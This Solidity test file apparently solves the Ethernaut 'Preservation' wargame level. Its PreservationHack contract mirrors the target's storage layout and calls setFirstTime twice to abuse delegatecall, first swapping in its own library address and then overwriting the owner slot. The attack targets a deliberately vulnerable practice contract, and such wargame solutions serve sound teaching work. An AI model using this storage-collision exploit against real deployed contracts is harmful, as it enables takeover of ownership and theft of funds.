// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "levels/Preservation/Preservation.sol";
import "levels/Preservation/PreservationFactory.sol";
import "./utils/EthernautTest.sol";

interface IPreservation {
    function setFirstTime(uint256) external;
}

contract PreservationHack {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    IPreservation public victim;

    constructor(address _targetAddress) {
        victim = IPreservation(_targetAddress);
    }

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }

    function exploit() external {
        victim.setFirstTime(uint256(uint160(address(this))));
        victim.setFirstTime(uint256(uint160(address(msg.sender))));
    }
}

contract PreservationTest is Test {
    function test_preservation() external {
        // Setup
        EthernautTest ethernautTest = new EthernautTest();
        PreservationFactory preservationFactory = new PreservationFactory();
        address levelAddress = ethernautTest.setup(preservationFactory);

        // Exploit
        vm.startPrank(tx.origin);
        PreservationHack preservationHack = new PreservationHack(levelAddress);
        preservationHack.exploit();
        vm.stopPrank();

        // Submit
        ethernautTest.submit();
    }
}
